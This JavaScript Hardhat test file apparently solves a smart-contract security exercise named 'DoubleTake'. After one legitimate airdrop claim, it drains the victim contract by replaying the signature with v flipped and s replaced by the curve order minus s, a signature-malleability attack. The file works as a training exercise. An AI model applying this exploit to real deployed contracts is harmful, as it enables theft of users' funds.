const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const BN = require("bn.js");

const NAME = "DoubleTake";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value: ethers.utils.parseEther("2") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));

            // claim your first Ether
            const v = 28;
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v, r, s);
        });

        it("conduct your attack here", async function () {
            // claim second Ether,malleability reference: https://www.rareskills.io/post/smart-contract-security Signature malleability
            
            const v2 = 27; // flip v 28 =>27
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            // const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

            //  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 ((Number of points in the field)
            // flip s
            let s2 = new BN("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 16).sub(
                new BN("7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69", 16)
            );
            s2 = "0x" + s2.toString("hex");
            await victimContract
                .connect(attackerWallet)
                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v2, r, s2);
        });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.equal(0, "victim contract is drained");
        });
    });
});
